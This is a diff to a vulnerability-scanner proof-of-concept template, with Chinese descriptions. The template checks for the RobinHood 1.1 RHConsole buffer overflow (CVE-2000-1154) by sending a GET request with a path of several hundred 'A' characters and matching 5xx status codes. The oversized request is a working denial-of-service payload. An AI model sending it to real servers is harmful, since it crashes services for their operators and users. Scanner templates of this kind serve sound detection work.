@@ -1,8 +1,8 @@
 [info]
 author = "ave"
-description = "通过发送超长 HTTP 请求触发 RobinHood 1.1 Web 服务器 RHConsole 组件的缓冲区溢出，导致服务崩溃（DoS）。"
+description = "通过发送超长 HTTP 请求验证 RobinHood 1.1 Web 服务器 RHConsole 组件的缓冲区溢出漏洞。向目标发送超长 URI 路径的 GET 请求，触发缓冲区溢出导致服务拒绝响应。"
 id = "POC-AVE-2000-0826"
-name = "CVE-2000-1154 PoC"
+name = "RobinHood 1.1 HTTP Long Request Buffer Overflow PoC"
 severity = "medium"
 tags = ["ave-2000-0826"]
 vuln_id = [
@@ -15,14 +15,14 @@ logic = "all"
 
 [[poc.requests]]
 method = "GET"
-path = "/{{BaseURL}}/{{repeat('A', 4096)}}"
+path = "/{{BaseURL}}/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
 protocol = "http"
 
 [poc.requests.headers]
 User-Agent = "AVE/1.0"
 
 [[poc.requests.matchers]]
-expect = false
+expect = true
 status = [
     500,
     502,
@@ -30,12 +30,3 @@ status = [
     504,
 ]
 type = "status"
-
-[[poc.requests.matchers]]
-expect = true
-part = "body"
-type = "word"
-words = [
-    "timeout",
-    "connection reset",
-]
